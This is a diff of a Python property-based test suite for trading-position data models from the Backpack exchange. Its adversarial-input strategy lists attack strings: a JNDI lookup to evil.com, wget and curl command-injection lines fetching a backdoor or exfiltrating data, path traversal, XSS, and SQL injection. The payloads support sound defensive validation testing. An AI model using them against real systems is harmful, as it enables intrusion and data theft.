@@ -1,12 +1,24 @@
-"""Unit tests for Backpack raw position models.
+"""Property-based tests for Backpack raw position models.
 
-Tests validation and processing of position data from the Backpack exchange API
-including position structures, margin information, and position-related calculations.
+These tests validate critical security boundary models that process external trading position data.
+The models tested here are essential for trading operations and financial position tracking.
+
+SECURITY CRITICAL: These raw models protect against:
+- Malicious position data that could manipulate trading calculations
+- Financial precision errors in position sizing and PnL calculations
+- Buffer overflow attacks through oversized position identifiers
+- Injection attacks through symbol and position field manipulation
+- Timestamp manipulation that could affect order timing
+
+Property testing ensures comprehensive coverage of trading edge cases and adversarial inputs.
 """
 
+from decimal import Decimal
 from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_margin_functions import (
@@ -17,6 +29,7 @@ from cyberdelta.apis.backpack.models.bp_raw_position import (
     BackpackRawPositionResponse,
     BackpackRawPositionUpdate,
 )
+from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import (
     DateTimeParsingError,
@@ -25,438 +38,837 @@ from cyberdelta.exceptions.parsing import (
 )
 
 
-"""
-Unit tests for BackpackRawPosition and related Raw models.
-
-**Boundary Validation Pattern (Project Standard):**
-- All string fields in Raw models are strictly validated for:
-    - Type: must be `str` (not bytes, int, list, etc.)
-    - Non-emptiness (unless explicitly allowed)
-    - Max length (per OpenAPI spec)
-    - Valid UTF-8 encoding (no lone surrogates or invalid unicode)
-    - **Invalid unicode or broken types are always rejected** with `ValidationError`
-      (if caught by the validator) or `UnicodeEncodeError`
-      (if Python or Pydantic internals hit the error first).
-- This test suite includes adversarial/hostile input cases to ensure the Raw model
-  boundary is robust and spec-aligned.
-
-This pattern is enforced for all Raw models in the CyberDeltaEngine project.
-"""
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR POSITION MODEL TESTING
+# =============================================================================
 
 
-# --- BackpackRawPositionResponse ---
+def position_decimal_strategy() -> SearchStrategy[str]:
+    """Generate decimal strings for position financial fields."""
+    return st.one_of([
+        # Trading position amounts
+        st.decimals(min_value=Decimal("-1000000"), max_value=Decimal("1000000"), places=8).map(str),
+        st.decimals(min_value=Decimal("-100000"), max_value=Decimal("100000"), places=6).map(str),
+        # Common position values
+        st.just("0"),
+        st.just("0.0"),
+        st.just("-100.50"),  # Negative PnL
+        st.just("1500.25"),  # Positive position
+        st.just("0.00000001"),  # Minimum precision
+        st.just("-999999.99999999"),  # Large loss
+        st.just("999999.99999999"),  # Large gain
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e6"),
+        st.just("-1.5e3"),
+        st.just("2.5e-4"),
+    ])
 
-# --- Fixtures ---
+
+def trading_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid trading symbol strings."""
+    return st.one_of([
+        # Common trading pairs
+        st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
+        # Valid symbol formats
+        st.text(
+            min_size=3,
+            max_size=64,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ).filter(lambda x: "_" in x and len(x.encode("utf-8")) <= 64),
+        # Edge cases
+        st.text(min_size=1, max_size=64).filter(
+            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
+        ),
+    ])
 
 
-@pytest.fixture
-def valid_imf_function_data() -> dict[str, str]:
-    """Return valid imf function data for testing."""
-    return {"base": "0.1", "factor": "0.5"}
+def position_id_strategy() -> SearchStrategy[str]:
+    """Generate valid position ID strings."""
+    return st.one_of([
+        # Common formats
+        st.text(
+            min_size=1,
+            max_size=64,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ),
+        # Typical patterns
+        st.just("pos_123456"),
+        st.just("position_abc123def"),
+        st.just("bp_pos_789xyz"),
+        # UUID-like
+        st.uuids().map(str),
+        # Edge cases
+        st.text(min_size=1, max_size=64).filter(
+            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
+        ),
+    ])
 
 
-@pytest.fixture
-def valid_mmf_function_data() -> dict[str, str]:
-    """Return valid mmf function data for testing."""
-    return {"base": "0.05", "factor": "0.25"}
+def user_id_strategy() -> SearchStrategy[int]:
+    """Generate valid user ID integers."""
+    return st.one_of([
+        st.integers(min_value=0, max_value=2**31 - 1),  # Standard range
+        st.just(0),  # Edge case
+        st.just(123456789),  # Common pattern
+        st.just(999999999),  # Large ID
+    ])
 
 
-@pytest.fixture
-def valid_position_data(
-    valid_imf_function_data: dict[str, str],
-    valid_mmf_function_data: dict[str, str],
-) -> dict[str, Any]:
-    """Return valid position data for testing."""
-    # Fixture now correctly depends on imf/mmf data fixtures
+def timestamp_strategy() -> SearchStrategy[Any]:
+    """Generate valid timestamp values."""
+    return st.one_of([
+        # Unix timestamps (milliseconds)
+        st.integers(min_value=1000000000000, max_value=2000000000000),
+        # Unix timestamps (seconds)
+        st.integers(min_value=1000000000, max_value=2000000000),
+        # Float timestamps
+        st.floats(
+            min_value=1000000000.0, max_value=2000000000.0, allow_nan=False, allow_infinity=False
+        ),
+        # ISO format strings
+        st.just("2023-03-15T12:00:00Z"),
+        st.just("2024-01-01T00:00:00.000Z"),
+        # String timestamps
+        st.integers(min_value=1000000000000, max_value=2000000000000).map(str),
+        # None for optional fields
+        st.none(),
+    ])
+
+
+@st.composite
+def margin_function_data(draw) -> dict[str, str]:
+    """Generate valid margin function data."""
     return {
-        "breakEvenPrice": "20000.50",
-        "entryPrice": "19800.00",
-        "estLiquidationPrice": "15000.00",
-        "imf": "0.1234",
-        "imfFunction": valid_imf_function_data,
-        "markPrice": "20100.75",
-        "mmf": "0.0678",
-        "mmfFunction": valid_mmf_function_data,
-        "netCost": "-1980.00",
-        "netQuantity": "0.1",
-        "netExposureQuantity": "0.1",
-        "netExposureNotional": "2010.075",
-        "pnlRealized": "5.00",
-        "pnlUnrealized": "30.075",
-        "cumulativeFundingPayment": "-1.25",
-        "symbol": "BTC_USDC",
-        "userId": 123456789,
-        "positionId": "pos_abc123",
-        "cumulativeInterest": "0.0",
-        "subaccountId": 0,  # Added required field
+        "base": draw(position_decimal_strategy()),
+        "factor": draw(position_decimal_strategy()),
     }
 
 
-@pytest.fixture
-def valid_position_update_data() -> dict[str, Any]:
-    """Return valid position update data for testing."""
+@st.composite
+def valid_position_response_data(draw) -> dict[str, Any]:
+    """Generate valid position response data structure."""
+    imf_data = draw(margin_function_data())
+    mmf_data = draw(margin_function_data())
+
+    return {
+        "breakEvenPrice": draw(position_decimal_strategy()),
+        "entryPrice": draw(position_decimal_strategy()),
+        "estLiquidationPrice": draw(position_decimal_strategy()),
+        "imf": draw(position_decimal_strategy()),
+        "imfFunction": imf_data,
+        "markPrice": draw(position_decimal_strategy()),
+        "mmf": draw(position_decimal_strategy()),
+        "mmfFunction": mmf_data,
+        "netCost": draw(position_decimal_strategy()),
+        "netQuantity": draw(position_decimal_strategy()),
+        "netExposureQuantity": draw(position_decimal_strategy()),
+        "netExposureNotional": draw(position_decimal_strategy()),
+        "pnlRealized": draw(position_decimal_strategy()),
+        "pnlUnrealized": draw(position_decimal_strategy()),
+        "cumulativeFundingPayment": draw(position_decimal_strategy()),
+        "symbol": draw(trading_symbol_strategy()),
+        "userId": draw(user_id_strategy()),
+        "positionId": draw(position_id_strategy()),
+        "subaccountId": draw(st.integers(min_value=0, max_value=1000)),
+        "cumulativeInterest": draw(position_decimal_strategy()),
+    }
+
+
+@st.composite
+def valid_position_update_data(draw) -> dict[str, Any]:
+    """Generate valid position update data structure."""
     return {
         "e": "positionUpdate",
-        "E": 1678886400000,  # Example timestamp
-        "s": "SOL_USDC",
-        "b": "22.50",  # break_event_price
-        "B": "22.00",  # entry_price
-        "l": "18.00",  # liquidation_price
-        "f": "0.05",  # initial_margin_fraction
-        "M": "23.10",  # mark_price
-        "m": "0.02",  # maintenance_margin_fraction
-        "q": "10.5",  # net_quantity
-        "Q": "10.5",  # net_exposure_quantity
-        "n": "242.55",  # net_exposure_notional
+        "E": draw(timestamp_strategy()),
+        "s": draw(trading_symbol_strategy()),
+        "b": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "B": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "l": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "f": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "M": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "m": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "q": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "Q": draw(st.one_of([position_decimal_strategy(), st.none()])),
+        "n": draw(st.one_of([position_decimal_strategy(), st.none()])),
     }
 
 
-# --- Success Cases: BackpackRawPosition ---
+def malicious_position_strategy() -> SearchStrategy[Any]:
+    """Generate malicious strings for position security testing."""
+    return st.one_of([
+        # Financial manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-positions}"),
+        st.just("999999999999999999999999999999.99"),  # Overflow attempt
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('position-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE positions;--"),
+        st.just("1' UNION SELECT * FROM users--"),
+        # Buffer overflow attempts
+        st.text(min_size=10000, max_size=50000),
+        st.just("P" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.users.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.position > 1000000"}'),
+    ])
 
 
-def test_BackpackRawPosition_valid(valid_position_data: dict[str, Any]) -> None:
-    """Test BackpackRawPosition valid."""
-    pos = BackpackRawPositionResponse.model_validate(valid_position_data)
-    assert pos.symbol == "BTC_USDC"
-    assert pos.user_id == 123456789
-    assert pos.position_id == "pos_abc123"
-    assert pos.break_even_price == "20000.50"
-    assert pos.imf == "0.1234"
-    assert isinstance(pos.imf_function, BackpackRawImfFunction)
-    assert pos.imf_function.base == "0.1"
-    assert pos.imf_function.factor == "0.5"
-    assert isinstance(pos.mmf_function, BackpackRawMmfFunction)
-    assert pos.mmf_function.base == "0.05"
-    assert pos.mmf_function.factor == "0.25"
-    assert pos.model_config.get("extra") == "forbid"
-    assert pos.model_config.get("frozen") is True
+def invalid_position_type_strategy() -> SearchStrategy[Any]:
+    """Generate invalid types for position field validation testing."""
+    return st.one_of([
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+        # Complex nested structures
+        st.lists(st.dictionaries(st.text(), st.integers())),
+        st.dictionaries(st.text(), st.lists(st.text())),
+    ])
 
 
-def test_BackpackRawPosition_valid_int_user_id_str(
-    valid_position_data: dict[str, Any],  # Add fixture dependency
-    valid_imf_function_data: dict[str, str],  # Add fixture dependency
-    valid_mmf_function_data: dict[str, str],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPosition valid int user id str."""
-    # Note: valid_position_data fixture already includes imf/mmf data
-    data = valid_position_data  # Use the injected fixture directly
-    data["userId"] = "987654321"
-    pos = BackpackRawPositionResponse.model_validate(data)
-    assert pos.user_id == 987654321
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW POSITION RESPONSE MODEL
+# =============================================================================
 
 
-# --- Failure Cases: BackpackRawPositionResponse ---
+class TestBackpackRawPositionResponseProperties:
+    """Property-based tests for BackpackRawPositionResponse validation and security."""
 
+    @given(position_data=valid_position_response_data())
+    def test_position_validation_success_properties(self, position_data: dict[str, Any]) -> None:
+        """Property: Valid position data should always create valid BackpackRawPositionResponse objects."""
+        # Skip invalid nested margin function data
+        try:
+            for field in [
+                "breakEvenPrice",
+                "entryPrice",
+                "estLiquidationPrice",
+                "imf",
+                "markPrice",
+                "mmf",
+                "netCost",
+                "netQuantity",
+                "netExposureQuantity",
+                "netExposureNotional",
+                "pnlRealized",
+                "pnlUnrealized",
+                "cumulativeFundingPayment",
+                "cumulativeInterest",
+            ]:
+                decimal_val = Decimal(position_data[field])
+                assume(decimal_val.is_finite())
 
-@pytest.mark.parametrize(
-    ("field", "value", "expected_msg_part"),
-    [
-        ("symbol", "", "String cannot be empty"),
-        ("symbol", "A" * 65, "must be string with max length 64, got string with length 65"),
-        ("positionId", None, "Expected string, got NoneType"),  # positionId is required
-        ("userId", -1, "Must be non-negative"),
-        ("userId", "abc", "Must be an integer"),
-        ("userId", 1.0, "Must be an integer"),
-        ("breakEvenPrice", "inf", "finite decimal"),
-        ("entryPrice", "nan", "finite decimal"),
-        ("estLiquidationPrice", "", "String cannot be empty"),
-        ("imf", "1.2.3", "finite decimal"),  # Invalid decimal string
-        ("markPrice", None, "Field required"),
-        ("mmf", "   ", "String cannot be empty"),
-        ("netCost", "infinity", "finite decimal"),
-        ("netQuantity", "-inf", "finite decimal"),
-        ("netExposureNotional", True, "Expected string"),
-        ("pnlRealized", "", "String cannot be empty"),
-        ("pnlUnrealized", "NaN", "finite decimal"),
-        ("cumulativeFundingPayment", None, "Field required"),
-        ("imfFunction", {"base": "0.1"}, "Field required"),  # Missing factor
-        ("imfFunction", {"base": "inf", "factor": "0.5"}, "finite decimal"),
-        ("imfFunction", None, "Field required"),
-        ("imfFunction", "notadict", "Expected a dictionary"),
-        ("mmfFunction", {"base": "0.1", "factor": "1.2.3"}, "finite decimal"),
-    ],
-)
-def test_BackpackRawPosition_invalid_fields(
-    field: str,
-    value: str | float | bool | dict[str, Any] | None,  # Invalid types for Pydantic
-    expected_msg_part: str,
-    valid_position_data: dict[str, Any],  # Add fixture dependency
-    valid_imf_function_data: dict[str, str],  # Add fixture dependency
-    valid_mmf_function_data: dict[str, str],  # Add fixture dependency
-) -> None:
-    """Test BackpackRawPosition invalid fields."""
-    # Note: valid_position_data fixture already includes imf/mmf data
-    data = valid_position_data  # Use the injected fixture directly
-    # Special handling for nested dicts
-    if field in ["imfFunction", "mmfFunction"]:
-        data[field] = value  # Replace entire dict
-    else:
-        data[field] = value
+            # Check margin function data
+            for func_field in ["base", "factor"]:
+                imf_val = Decimal(position_data["imfFunction"][func_field])
+                mmf_val = Decimal(position_data["mmfFunction"][func_field])
+                assume(imf_val.is_finite() and mmf_val.is_finite())
 
-    # Different exceptions are raised based on the specific validation failure
-    type_error_cases = [
-        field == "positionId" and value is None,
-        field == "userId" and value == 1.0,
-        field == "markPrice" and value is None,
-        field == "netExposureNotional" and value is True,
-        field == "cumulativeFundingPayment" and value is None,
-    ]
-    empty_string_cases = [
-        field == "symbol" and not value,
-        field == "estLiquidationPrice" and not value,
-        field == "mmf" and value == "   ",
-        field == "pnlRealized" and not value,
-    ]
-    type_field_error_cases = [
-        field == "symbol" and value == "A" * 65,  # String too long
-    ]
+        except (ValueError, TypeError, KeyError):
+            assume(False)
 
-    if any(type_error_cases):
-        with pytest.raises(TypeError) as type_exc_info:
-            BackpackRawPositionResponse.model_validate(data)
-        # For TypeError cases, just verify we got the expected exception type
-        # since field validation order may vary
-        assert isinstance(type_exc_info.value, TypeError)
-    elif any(empty_string_cases):
-        with pytest.raises(EmptyStringError) as empty_exc_info:
-            BackpackRawPositionResponse.model_validate(data)
-        # Check if the expected message part is present
-        assert expected_msg_part in str(empty_exc_info.value), (
-            f"Field: {field}, Value: {value!r}, Error: {empty_exc_info.value}"
+        # Skip empty or invalid strings
+        assume(position_data["symbol"].strip())
+        assume(position_data["positionId"].strip())
+        assume(isinstance(position_data["userId"], int) and position_data["userId"] >= 0)
+        assume(
+            isinstance(position_data["subaccountId"], int) and position_data["subaccountId"] >= 0
         )
-    elif any(type_field_error_cases):
-        with pytest.raises(TypeFieldError) as type_field_exc_info:
-            BackpackRawPositionResponse.model_validate(data)
-        # Check if the expected message part is present
-        assert expected_msg_part in str(type_field_exc_info.value), (
-            f"Field: {field}, Value: {value!r}, Error: {type_field_exc_info.value}"
+
+        obj = BackpackRawPositionResponse.model_validate(position_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawPositionResponse)
+
+        # Property: All decimal fields should be preserved as strings
+        assert isinstance(obj.break_even_price, str)
+        assert isinstance(obj.entry_price, str)
+        assert isinstance(obj.net_quantity, str)
+        assert isinstance(obj.pnl_realized, str)
+        assert isinstance(obj.pnl_unrealized, str)
+
+        # Property: Values should be preserved exactly
+        assert obj.symbol == position_data["symbol"]
+        assert obj.user_id == position_data["userId"]
+        assert obj.position_id == position_data["positionId"]
+
+        # Property: Nested margin functions should be properly typed
+        assert isinstance(obj.imf_function, BackpackRawImfFunction)
+        assert isinstance(obj.mmf_function, BackpackRawMmfFunction)
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from([
+            "symbol",
+            "positionId",
+            "breakEvenPrice",
+            "entryPrice",
+            "netQuantity",
+            "pnlRealized",
+            "pnlUnrealized",
+            "markPrice",
+        ]),
+        malicious_value=malicious_position_strategy(),
+    )
+    def test_position_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Position model should reject malicious inputs safely."""
+        base_data = {
+            "breakEvenPrice": "20000.50",
+            "entryPrice": "19800.00",
+            "estLiquidationPrice": "15000.00",
+            "imf": "0.1234",
+            "imfFunction": {"base": "0.1", "factor": "0.5"},
+            "markPrice": "20100.75",
+            "mmf": "0.0678",
+            "mmfFunction": {"base": "0.05", "factor": "0.25"},
+            "netCost": "-1980.00",
+            "netQuantity": "0.1",
+            "netExposureQuantity": "0.1",
+            "netExposureNotional": "2010.075",
+            "pnlRealized": "5.00",
+            "pnlUnrealized": "30.075",
+            "cumulativeFundingPayment": "-1.25",
+            "symbol": "BTC_USDC",
+            "userId": 123456789,
+            "positionId": "pos_abc123",
+            "cumulativeInterest": "0.0",
+            "subaccountId": 0,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((
+            ValidationError,
+            TypeError,
+            EmptyStringError,
+            TypeFieldError,
+            DecimalFiniteError,
+        )):
+            BackpackRawPositionResponse.model_validate(base_data)
+
+    @given(
+        field_name=st.sampled_from([
+            "userId",
+            "subaccountId",
+            "breakEvenPrice",
+            "symbol",
+            "positionId",
+        ]),
+        invalid_value=invalid_position_type_strategy(),
+    )
+    def test_position_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
+        """Property: Position model should enforce strict type safety."""
+        base_data = {
+            "breakEvenPrice": "20000.50",
+            "entryPrice": "19800.00",
+            "estLiquidationPrice": "15000.00",
+            "imf": "0.1234",
+            "imfFunction": {"base": "0.1", "factor": "0.5"},
+            "markPrice": "20100.75",
+            "mmf": "0.0678",
+            "mmfFunction": {"base": "0.05", "factor": "0.25"},
+            "netCost": "-1980.00",
+            "netQuantity": "0.1",
+            "netExposureQuantity": "0.1",
+            "netExposureNotional": "2010.075",
+            "pnlRealized": "5.00",
+            "pnlUnrealized": "30.075",
+            "cumulativeFundingPayment": "-1.25",
+            "symbol": "BTC_USDC",
+            "userId": 123456789,
+            "positionId": "pos_abc123",
+            "cumulativeInterest": "0.0",
+            "subaccountId": 0,
+        }
+        base_data[field_name] = invalid_value
+
+        # Property: Wrong types should be rejected
+        with pytest.raises((ValidationError, TypeError)):
+            BackpackRawPositionResponse.model_validate(base_data)
+
+    @given(
+        decimal_field=st.sampled_from([
+            "breakEvenPrice",
+            "entryPrice",
+            "netQuantity",
+            "pnlRealized",
+            "pnlUnrealized",
+        ]),
+        decimal_value=st.one_of([
+            # Valid decimals
+            st.just("0"),
+            st.just("-1000.50"),
+            st.just("1e6"),
+            st.just("-2.5e3"),
+            # Invalid decimals
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("1..0"),
+            st.just("1.2.3"),
+            st.just("not_a_number"),
+            st.just(""),
+            st.just("   "),
+        ]),
+    )
+    def test_position_decimal_validation_properties(
+        self, decimal_field: str, decimal_value: str
+    ) -> None:
+        """Property: Position decimal fields should validate properly."""
+        position_data = {
+            "breakEvenPrice": "20000.50",
+            "entryPrice": "19800.00",
+            "estLiquidationPrice": "15000.00",
+            "imf": "0.1234",
+            "imfFunction": {"base": "0.1", "factor": "0.5"},
+            "markPrice": "20100.75",
+            "mmf": "0.0678",
+            "mmfFunction": {"base": "0.05", "factor": "0.25"},
+            "netCost": "-1980.00",
+            "netQuantity": "0.1",
+            "netExposureQuantity": "0.1",
+            "netExposureNotional": "2010.075",
+            "pnlRealized": "5.00",
+            "pnlUnrealized": "30.075",
+            "cumulativeFundingPayment": "-1.25",
+            "symbol": "BTC_USDC",
+            "userId": 123456789,
+            "positionId": "pos_abc123",
+            "cumulativeInterest": "0.0",
+            "subaccountId": 0,
+        }
+        position_data[decimal_field] = decimal_value
+
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not decimal_value.strip()
+
+            if is_finite and not is_empty:
+                # Property: Valid finite decimals should be accepted
+                obj = BackpackRawPositionResponse.model_validate(position_data)
+                assert (
+                    getattr(obj, decimal_field.replace("P", "_p").replace("Q", "_q").lower())
+                    == decimal_value
+                )
+
+                # Property: Parsed value should be finite
+                parsed_val = Decimal(
+                    getattr(obj, decimal_field.replace("P", "_p").replace("Q", "_q").lower())
+                )
+                assert parsed_val.is_finite()
+            else:
+                # Property: Non-finite or empty values should be rejected
+                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
+                    BackpackRawPositionResponse.model_validate(position_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable decimal strings should be rejected
+            with pytest.raises(ValidationError):
+                BackpackRawPositionResponse.model_validate(position_data)
+
+    @given(position_data=valid_position_response_data())
+    def test_position_financial_precision_properties(self, position_data: dict[str, Any]) -> None:
+        """Property: Position model should preserve financial precision exactly."""
+        # Only test valid finite decimals
+        try:
+            decimal_fields = [
+                "breakEvenPrice",
+                "entryPrice",
+                "netQuantity",
+                "pnlRealized",
+                "pnlUnrealized",
+            ]
+            for field in decimal_fields:
+                decimal_val = Decimal(position_data[field])
+                assume(decimal_val.is_finite())
+
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        assume(position_data["symbol"].strip())
+        assume(position_data["positionId"].strip())
+
+        obj = BackpackRawPositionResponse.model_validate(position_data)
+
+        # Property: Exact string values should be preserved
+        assert obj.break_even_price == position_data["breakEvenPrice"]
+        assert obj.entry_price == position_data["entryPrice"]
+        assert obj.net_quantity == position_data["netQuantity"]
+        assert obj.pnl_realized == position_data["pnlRealized"]
+        assert obj.pnl_unrealized == position_data["pnlUnrealized"]
+
+        # Property: Should be parseable back to same decimal values
+        assert Decimal(obj.break_even_price) == Decimal(position_data["breakEvenPrice"])
+        assert Decimal(obj.pnl_realized) == Decimal(position_data["pnlRealized"])
+        assert Decimal(obj.pnl_unrealized) == Decimal(position_data["pnlUnrealized"])
+
+    @given(position_data=valid_position_response_data())
+    def test_position_immutability_properties(self, position_data: dict[str, Any]) -> None:
+        """Property: Position objects should be immutable after creation."""
+        # Skip invalid data
+        try:
+            decimal_val = Decimal(position_data["breakEvenPrice"])
+            assume(decimal_val.is_finite() and position_data["symbol"].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawPositionResponse.model_validate(position_data)
+
+        # Property: Fields should not be modifiable
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.symbol = "modified_symbol"
+
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.net_quantity = "modified_quantity"
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW POSITION UPDATE MODEL
+# =============================================================================
+
+
+class TestBackpackRawPositionUpdateProperties:
+    """Property-based tests for BackpackRawPositionUpdate validation and security."""
+
+    @given(update_data=valid_position_update_data())
+    def test_position_update_validation_success_properties(
+        self, update_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid position update data should always create valid objects."""
+        # Skip invalid decimal values in optional fields
+        try:
+            for field_key, field_value in update_data.items():
+                if (
+                    field_key in ["b", "B", "l", "f", "M", "m", "q", "Q", "n"]
+                    and field_value is not None
+                ):
+                    decimal_val = Decimal(field_value)
+                    assume(decimal_val.is_finite())
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty symbols
+        assume(update_data["s"].strip())
+
+        obj = BackpackRawPositionUpdate.model_validate(update_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawPositionUpdate)
+
+        # Property: Event type should be literal
+        assert obj.event_type == "positionUpdate"
+
+        # Property: Symbol should be preserved
+        assert obj.symbol == update_data["s"]
+
+        # Property: Optional fields should handle None correctly
+        if update_data["b"] is not None:
+            assert obj.break_event_price == update_data["b"]
+        else:
+            assert obj.break_event_price is None
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["e", "s", "b", "B", "M", "q"]),
+        malicious_value=malicious_position_strategy(),
+    )
+    def test_position_update_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Position update model should reject malicious inputs safely."""
+        base_data = {
+            "e": "positionUpdate",
+            "E": 1678886400000,
+            "s": "SOL_USDC",
+            "b": "22.50",
+            "B": "22.00",
+            "l": "18.00",
+            "f": "0.05",
+            "M": "23.10",
+            "m": "0.02",
+            "q": "10.5",
+            "Q": "10.5",
+            "n": "242.55",
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((
+            ValidationError,
+            TypeError,
+            EmptyStringError,
+            TypeFieldError,
+            DecimalFiniteError,
+            DateTimeParsingError,
+            TimestampFormatError,
+        )):
+            BackpackRawPositionUpdate.model_validate(base_data)
+
+    @given(
+        timestamp_value=st.one_of([
+            st.just("not-a-date"),
+            st.just([]),
+            st.just({}),
+            st.text().filter(lambda x: not x.isdigit() and "T" not in x),
+        ])
+    )
+    def test_position_update_timestamp_validation_properties(self, timestamp_value: Any) -> None:
+        """Property: Position update timestamps should be validated properly."""
+        update_data = {
+            "e": "positionUpdate",
+            "E": timestamp_value,
+            "s": "SOL_USDC",
+            "b": "22.50",
+            "B": "22.00",
+            "l": "18.00",
+            "f": "0.05",
+            "M": "23.10",
+            "m": "0.02",
+            "q": "10.5",
+            "Q": "10.5",
+            "n": "242.55",
+        }
+
+        # Property: Invalid timestamps should be rejected
+        with pytest.raises((ValidationError, DateTimeParsingError, TimestampFormatError)):
+            BackpackRawPositionUpdate.model_validate(update_data)
+
+    @given(invalid_event=st.text().filter(lambda x: x != "positionUpdate"))
+    def test_position_update_event_type_validation_properties(self, invalid_event: str) -> None:
+        """Property: Position update event type should be validated as literal."""
+        update_data = {
+            "e": invalid_event,
+            "E": 1678886400000,
+            "s": "SOL_USDC",
+            "b": "22.50",
+            "B": "22.00",
+            "l": "18.00",
+            "f": "0.05",
+            "M": "23.10",
+            "m": "0.02",
+            "q": "10.5",
+            "Q": "10.5",
+            "n": "242.55",
+        }
+
+        # Property: Invalid event types should be rejected
+        if not invalid_event.strip():
+            with pytest.raises(EmptyStringError):
+                BackpackRawPositionUpdate.model_validate(update_data)
+        else:
+            with pytest.raises(ValidationError) as exc_info:
+                BackpackRawPositionUpdate.model_validate(update_data)
+            # Property: Error should indicate invalid literal value
+            error_msg = str(exc_info.value)
+            assert "Input should be 'positionUpdate'" in error_msg or "Invalid value" in error_msg
+
+
+# =============================================================================
+# INTEGRATION PROPERTY TESTS
+# =============================================================================
+
+
+class TestBackpackRawPositionIntegrationProperties:
+    """Integration property tests for both position models."""
+
+    @given(position_data=valid_position_response_data(), update_data=valid_position_update_data())
+    def test_position_models_consistency_properties(
+        self, position_data: dict[str, Any], update_data: dict[str, Any]
+    ) -> None:
+        """Property: Both position models should have consistent validation behavior."""
+        # Filter to valid inputs only
+        try:
+            # Validate position data decimals
+            for field in ["breakEvenPrice", "entryPrice", "netQuantity"]:
+                decimal_val = Decimal(position_data[field])
+                assume(decimal_val.is_finite())
+
+            # Validate update data decimals
+            for field_key, field_value in update_data.items():
+                if field_key in ["b", "B", "q"] and field_value is not None:
+                    decimal_val = Decimal(field_value)
+                    assume(decimal_val.is_finite())
+
+        except (ValueError, TypeError):
+            assume(False)
+
+        assume(position_data["symbol"].strip())
+        assume(update_data["s"].strip())
+
+        # Property: Both models should validate successfully with valid data
+        position_obj = BackpackRawPositionResponse.model_validate(position_data)
+        update_obj = BackpackRawPositionUpdate.model_validate(update_data)
+
+        # Property: Both should have consistent model configuration
+        assert position_obj.model_config.get("extra") == "forbid"
+        assert update_obj.model_config.get("extra") == "forbid"
+        assert position_obj.model_config.get("frozen") is True
+        assert update_obj.model_config.get("frozen") is True
+
+    @given(
+        malicious_data=st.dictionaries(
+            st.sampled_from([
+                "symbol",
+                "positionId",
+                "breakEvenPrice",
+                "netQuantity",
+                "s",
+                "b",
+                "q",
+            ]),
+            malicious_position_strategy(),
         )
-    else:
-        with pytest.raises(ValidationError) as validation_exc_info:
-            BackpackRawPositionResponse.model_validate(data)
-        # Check if the specific field name or a relevant part of the error message is present
